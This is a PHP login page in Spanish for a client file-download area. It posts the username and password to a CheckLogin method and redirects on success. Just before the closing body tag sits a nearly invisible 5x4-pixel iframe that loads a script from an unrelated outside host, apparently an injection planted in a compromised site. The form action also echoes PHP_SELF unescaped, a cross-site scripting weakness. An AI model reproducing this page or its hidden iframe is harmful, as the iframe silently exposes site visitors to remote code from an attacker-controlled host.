<?
/****************************/
/** Validacion de Usuarios **/
/****************************/
$Error = false;

session_start();
session_destroy();

if (isset($_POST["save"])) {
	include '../../classes/clsSqlServer.php';
	include '../../classes/clsClientes.php';

	$SqlSrv = new SqlServer();
	$ManCli	= new ManagerClientes();
		
	$SqlSrv->dbConnect();

	if ($_POST["username"] && $_POST["password"]){
		if($ManCli->CheckLogin($_POST["username"],$_POST["password"])) {
			header ("location: list_archivos.php");
			exit();
		} else {
			$Error = true;
		}
	} else {
		$Error = true;
	}
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<title>M S A</title>
<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../css/clientes.css">

</HEAD>

<body>

<div class="marco">
<TABLE border="0" cellpadding="0" cellspacing="0" width="776">
	<TR>
		<TD height="86"><!-- <img src="../images/clientes/top.gif" width="776" height="86"> --></TD>
	</TR>
</TABLE>
<TABLE border="0" cellpadding="0" cellspacing="0" width="776">
	<TR>
		<TD width="44">&nbsp;</TD>
		<TD width="53" bgcolor="#666666"></TD>
		<TD width="679" bgcolor="#999999"><img src="../images/clientes/archivos.gif" width="99" height="27"></TD>
	</TR>
</TABLE>
<TABLE border="0" cellpadding="0" cellspacing="0" width="776" height="437">
	<TR valign="top">
		<TD width="44">&nbsp;</TD>
		<TD width="53" bgcolor="#A5A5A5"><img src="../images/clientes/mundo.jpg" width="53" height="215"></TD>
		<TD width="679" class="agua" align="right">
			<TABLE border="0" cellpadding="20" cellspacing="0">
			<FORM METHOD=POST action="<?=$_SERVER['PHP_SELF']?>" name="forma">
				<TR>
					<TD>
					<TABLE cellpadding=2 cellspacing=0 border=0>
						<TR>
							<TD colspan="2" class="txt" height="20">Ingrese su nombre de usuario y clave.</TD>
						</TR>
						<TR>
							<TD colspan="2" height="10"><img src="../images/clientes/ptos.gif" width="427" height="1"></TD>
						</TR>
						<TR>
							<TD width="70" class="txt" align="right"><B>Usuario</B></TD>
							<TD width="357"><INPUT TYPE="text" NAME="username" class="input"></TD>
						</TR>
						<TR>
							<TD width="70" class="txt" align="right"><B>Password</B></TD>
							<TD width="357">
							<TABLE cellpadding=0 cellspacing=0 border=0>
								<TR>
									<TD><INPUT TYPE="password" NAME="password" class="input"></TD>
									<TD>&nbsp;&nbsp;</TD>
									<TD><INPUT TYPE="image" src="../images/clientes/fl.gif" width="14" height="14"></TD>
								</TR>
							</TABLE>
							</TD>
						</TR>
					</TABLE>
					</TD>
				</TR>
			<input type="hidden" name="save" value="1">
			</FORM>
			</TABLE>

			<?if ($Error) echo("<div class='error' align='center'><br><br><b>Usuario o Password incorrecto</b></div>");?>
		</TD>
	</TR>
</TABLE>
</div>

		
		

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
